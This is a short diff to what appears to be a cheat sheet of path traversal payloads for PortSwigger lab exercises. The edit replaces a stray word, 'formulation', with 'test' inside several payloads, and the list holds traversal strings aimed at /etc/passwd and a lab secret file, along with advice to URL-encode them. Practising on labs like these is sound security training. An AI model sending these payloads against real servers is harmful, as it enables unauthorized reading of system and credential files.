@@ -21,14 +21,14 @@ P.s: Little advice, try always put url-encoded payload in target parameters, you
 * Linux / Unix Standard:
   - `../../../etc/passwd`
   - `../../../../etc/passwd`
-  - ` formulation/../../../../../etc/passwd`
-  - ` formulation/../../ formulation/../../../../etc/passwd`
-  - `../../../ formulation/../../../../etc/passwd`
+  - ` test/../../../../../etc/passwd`
+  - ` test/../../test/../../../../etc/passwd`
+  - `../../../test/../../../../etc/passwd`
 
 * Target File (PortSwigger Lab Specific):
   - `../../../home/carlos/secret`
   - `../../../../home/carlos/secret`
-  - `../../ formulation/../../home/carlos/secret`
+  - `../../test/../../home/carlos/secret`
 
 * Absolute Path:
   - `/etc/passwd`
